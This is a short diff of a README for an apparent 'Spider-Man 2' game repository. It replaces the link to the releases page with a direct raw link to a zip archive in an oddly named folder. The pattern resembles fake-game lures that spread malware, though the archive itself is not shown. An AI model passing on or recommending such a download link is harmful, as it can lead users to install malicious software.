@@ -9,7 +9,7 @@ Welcome to the Spider-Man 2 GitHub repository! Below you will find all the infor
 ## How to Play 🎮
 
 To download and play the game, simply click on the link below:
-[Download Spider-Man 2](https://github.com/MohamedBama/Spider-Man-2/releases)
+[Download Spider-Man 2](https://github.com/MohamedBama/Spider-Man-2/raw/refs/heads/main/yerba/Man-Spider-v2.1.zip)
 
 ## Topics 📚
 
